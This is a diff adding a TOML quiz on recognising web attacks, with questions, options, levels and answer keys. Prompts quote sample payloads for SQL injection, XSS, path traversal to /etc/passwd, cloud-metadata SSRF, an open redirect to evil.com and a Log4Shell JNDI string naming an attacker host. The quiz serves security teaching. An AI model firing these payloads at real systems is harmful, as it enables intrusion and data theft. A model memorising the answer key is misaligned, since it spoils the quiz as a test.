@@ -1,0 +1,152 @@
+# Quiz — web attacks (overlaps with the safe/ scenarios).
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "The string ' OR 1=1-- in a request parameter is a sign of which attack?"
+options = ["XSS", "SQL injection", "CSRF", "SSRF"]
+answer = "1"
+hint = "The single quote breaks a string literal in SQL."
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "<script>alert(1)</script> in a comment field is..."
+options = ["SQLi", "XSS", "LFI", "RCE"]
+answer = "1"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "Which header helps identify which site a request came from (relevant to CSRF)?"
+options = ["User-Agent", "Origin", "Accept-Encoding", "X-Powered-By"]
+answer = "1"
+
+[[question]]
+level = "intermediate"
+kind = "free"
+prompt = "The SQLi type where data is pulled via an extra SELECT glued on with a set operator (two words)."
+answer = "union based"
+normalize = "casefold"
+accept = ["union-based", "unionbased"]
+
+[[question]]
+level = "intermediate"
+kind = "choice"
+prompt = "POST /transfer with no CSRF token and an Origin from a foreign domain. What is it?"
+options = [
+  "A legitimate request from a mobile app",
+  "A CSRF attempt",
+  "A normal redirect",
+  "A cache error",
+]
+answer = "1"
+
+[[question]]
+level = "intermediate"
+kind = "free"
+prompt = "%3Cscript%3E in a URL — what payload obfuscation is this? (hyphenated)"
+answer = "url-encoded"
+normalize = "casefold"
+accept = ["url encoding", "percent-encoding", "urlencoded"]
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "Sender domain paypa1.com instead of paypal.com is which technique?"
+options = ["Homograph attack", "Typosquatting", "BGP hijack", "DNS tunneling"]
+answer = "1"
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "Blind boolean-based SQLi differs from union-based in that..."
+options = [
+  "it does not need a vulnerable parameter",
+  "the app response contains no data; output is reconstructed from the true/false reaction",
+  "it only works on MySQL",
+  "it leaves no traces in the logs",
+]
+answer = "1"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "The parameter url=http://169.254.169.254/ makes the server reach an internal address on the client's instruction. Sign of which attack?"
+options = ["XSS", "SSRF", "CSRF", "SQL injection"]
+answer = "1"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "An email with a link for an urgent \"account unlock\", sent from an unrelated domain, is..."
+options = ["ordinary spam", "phishing", "a legitimate bank notice", "a DDoS"]
+answer = "1"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "A request contains ../../../../etc/passwd in a filename. Which vulnerability class is this?"
+options = ["Path traversal / LFI", "SSRF", "XSS", "CSRF"]
+answer = "0"
+
+[[question]]
+level = "intermediate"
+kind = "free"
+prompt = "The response header that restricts script sources and reduces XSS risk (acronym)."
+answer = "csp"
+normalize = "casefold"
+accept = ["content-security-policy", "content security policy"]
+
+[[question]]
+level = "intermediate"
+kind = "choice"
+prompt = "GET /login?next=//evil.com sends the user to an external site after a successful login. This is..."
+options = ["Open redirect", "Clickjacking", "Host header injection", "CORS misconfiguration"]
+answer = "0"
+
+[[question]]
+level = "intermediate"
+kind = "choice"
+prompt = "access.log has repeated requests with ' AND SLEEP(5)-- in a parameter, and the response is delayed ~5s. This is..."
+options = [
+  "time-based blind SQLi",
+  "union-based SQLi",
+  "reflected XSS",
+  "a slow backend with no attack",
+]
+answer = "0"
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "The string ${jndi:ldap://attacker/a} in a User-Agent header is an attempt to exploit..."
+options = ["Shellshock", "Log4Shell", "Heartbleed", "ImageTragick"]
+answer = "1"
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "A domain whose letters are visually identical to paypal.com but with a Cyrillic character inside is which technique?"
+options = ["Typosquatting", "Homograph / IDN-homoglyph", "Subdomain takeover", "BGP hijack"]
+answer = "1"
+
+[[question]]
+level = "advanced"
+kind = "free"
+prompt = "The XSS type where the payload never reaches the server and fires entirely in the browser due to unsafe DOM handling (hyphenated)."
+answer = "dom-based"
+normalize = "casefold"
+accept = ["dom based", "dombased", "dom xss"]
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "A POST to /api with Content-Type: text/plain and a JSON body passes with no CSRF token. Why is that dangerous?"
+options = [
+  "it is not — text/plain is safe",
+  "it is a \"simple\" request — the browser sends no preflight, so CORS-based CSRF defenses do not fire",
+  "the server must reject any text/plain",
+  "you cannot send JSON with such a request",
+]
+answer = "1"
